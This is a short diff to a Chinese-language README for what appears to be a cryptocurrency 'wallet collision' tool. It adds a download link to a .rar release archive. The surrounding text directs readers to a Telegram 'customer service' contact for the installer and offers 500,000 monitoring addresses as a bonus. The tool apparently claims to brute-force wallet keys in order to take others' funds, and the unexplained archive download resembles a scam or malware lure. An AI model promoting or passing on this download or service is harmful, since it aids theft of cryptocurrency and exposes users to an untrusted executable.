@@ -40,6 +40,8 @@
 
 ## 3.安装包
 
+   [点击这里进行下载](https://github.com/EthCollision/wallet_collission/releases/download/v1.0.0/wallet1.0.0.rar)
+
 ​    联系客服获取安装包 -》在线客服Telegram：<a href='https://t.me/web3_dev_gg' target="_blank" >咸鱼客服 </a>
 
 ​    赠送50w监控地址
